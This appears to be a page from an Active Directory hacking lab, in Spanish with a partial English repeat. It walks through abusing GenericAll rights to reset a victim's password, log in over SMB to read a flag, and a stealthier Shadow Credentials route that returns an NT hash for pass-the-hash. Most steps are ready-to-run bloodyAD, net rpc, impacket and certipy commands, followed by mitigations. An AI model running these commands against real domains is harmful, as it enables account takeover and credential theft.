Objetivo

svc.readonly tiene GenericAll sobre otro usuario del dominio. Cámbiale la contraseña sin conocer la anterior, autentícate con su identidad y lee //DC01/hr_private.

Flag: //{{ ad_dc_host }}/hr_private/flag-ad-08.txt — captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Resetear la contraseña de m.davis (tenemos GenericAll sobre él)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} \
  -u svc.readonly -p 'ReadOnly123!' \
  set password m.davis 'NewP@ss123!'

1 · Confirmar el derecho

GenericAll (control total) sobre un usuario permite, entre otras cosas, forzar el cambio de su contraseña sin conocer la anterior. BloodHound lo pinta como GenericAll → User.

# Con bloodyAD: ver quién tiene qué sobre m.davis (usa el sAMAccountName, no el nombre completo)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object m.davis --attr nTSecurityDescriptor

Nota sobre este Domain Controller: nxc ldap -M daclread no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa bloodyAD como en el comando de arriba.

2 · Resetear la contraseña de la víctima

# bloodyAD (fija una contraseña conocida)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  set password m.davis 'NewP@ss123!'

# net rpc (misma operación por SAMR)
net rpc password 'm.davis' 'NewP@ss123!' -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}

# pth-net / impacket-changepasswd también valen
impacket-changepasswd '{{ ad_realm_lower }}/m.davis'@{{ ad_dc_ip }} \
  -newpass 'NewP@ss123!' -altuser 'svc.readonly' -altpass 'ReadOnly123!' -reset

3 · Autenticarse como la víctima y capturar la flag

nxc smb {{ ad_dc_ip }} -u 'm.davis' -p 'NewP@ss123!' --shares

smbclient //{{ ad_dc_ip }}/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt'
cat flag-ad-08.txt

4 · Alternativa sigilosa: Shadow Credentials

Resetear una contraseña es ruidoso (rompe el login del usuario legítimo). Con GenericAll también puedes escribir msDS-KeyCredentialLink y autenticarte por PKINIT sin tocar la contraseña:

certipy-ad shadow auto -u svc.readonly@{{ ad_realm_lower }} -p 'ReadOnly123!' \
  -account m.davis -dc-ip {{ ad_dc_ip }} -ldap-simple-auth
# Devuelve el hash NT de m.davis → úsalo con pass-the-hash

Nota sobre este Domain Controller: certipy también usa bind NTLM en LDAP por defecto — falla igual que nxc ldap (ver AD 02), de ahí el flag -ldap-simple-auth. Con él la conexión y la escritura del ataque avanzan, pero el paso final revienta con invalid attribute type msDS-KeyCredentialLink: este dominio está provisionado a nivel funcional 2008 R2 y el esquema de Samba (adprep hasta Sch59) no incluye el atributo de Key Trust introducido en Windows Server 2016 — una limitación real del propio Samba, no de certipy ni de tu ataque. El reset de contraseña del paso 2 es, por tanto, el camino soportado para completar este laboratorio; Shadow Credentials queda documentado como referencia de un ataque real que sí funciona contra un DC Windows 2016+ con este mismo GenericAll.

Mitigación

  • Revisar y retirar ACEs GenericAll/GenericWrite/WriteOwner concedidos a cuentas no administrativas.
  • Proteger las cuentas sensibles con AdminSDHolder y el flag Protected Users.
  • Alertar sobre resets de contraseña (evento 4724) y escrituras de msDS-KeyCredentialLink.

Herramientas

bloodyAD net rpc impacket-changepasswd certipy-ad netexec (nxc)

1 · Confirm the right

GenericAll (full control) over a user allows, among other things, forcing a password change without knowing the old one. BloodHound draws it as GenericAll → User.

# With bloodyAD: see who has what over m.davis (use the sAMAccountName, not the full name)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object m.davis --attr nTSecurityDescriptor

Note about this Domain Controller: nxc ldap -M daclread does not work against this DC (the NTLM bind fails, see AD 02) — use bloodyAD as shown above.

2 · Reset the victim's password

# bloodyAD (set a known password)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  set password m.davis 'NewP@ss123!'

# net rpc (same operation over SAMR)
net rpc password 'm.davis' 'NewP@ss123!' -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}

4 · Stealthier alternative: Shadow Credentials

Resetting a password is noisy (it breaks the legitimate user's logon). With GenericAll you can instead write msDS-KeyCredentialLink and authenticate via PKINIT without touching the password:

certipy-ad shadow auto -u svc.readonly@{{ ad_realm_lower }} -p 'ReadOnly123!' \
  -account m.davis -dc-ip {{ ad_dc_ip }} -ldap-simple-auth
# Returns m.davis's NT hash → use it with pass-the-hash

Note about this Domain Controller: certipy also defaults to NTLM LDAP bind — it fails the same way nxc ldap does (see AD 02), hence -ldap-simple-auth. With it the connection and the attack's write step go through, but the final step blows up with invalid attribute type msDS-KeyCredentialLink: this domain is provisioned at 2008 R2 functional level and Samba's schema (adprep up to Sch59) doesn't include the Key Trust attribute introduced in Windows Server 2016 — a genuine Samba limitation, not a certipy or attack-technique failure. Resetting the password in step 2 is therefore the supported path to finish this lab; Shadow Credentials is documented here as a real technique that does work against a Windows Server 2016+ DC with this same GenericAll.

Mitigation

  • Review and remove GenericAll/GenericWrite/WriteOwner ACEs granted to non-admin accounts.
  • Protect sensitive accounts with AdminSDHolder and the Protected Users group.
  • Alert on password resets (event 4724) and msDS-KeyCredentialLink writes.

Tools
